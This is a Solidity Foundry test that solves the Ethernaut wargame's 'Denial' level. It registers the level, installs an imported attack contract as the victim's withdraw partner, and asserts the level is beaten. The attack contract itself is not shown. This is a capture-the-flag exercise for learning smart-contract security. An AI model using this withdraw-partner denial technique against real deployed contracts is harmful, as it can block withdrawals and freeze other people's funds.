// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/20-Denial/DenialAttack.sol';
import '../levels/20-Denial/DenialFactory.sol';
import '../core/Ethernaut.sol';

contract DenialTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function testDenialHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    DenialFactory denialFactory = new DenialFactory();
    ethernaut.registerLevel(denialFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(
      denialFactory
    );
    Denial denialContract = Denial(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    DenialAttack attackContract = new DenialAttack(levelAddress);
    denialContract.setWithdrawPartner(address(attackContract));

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
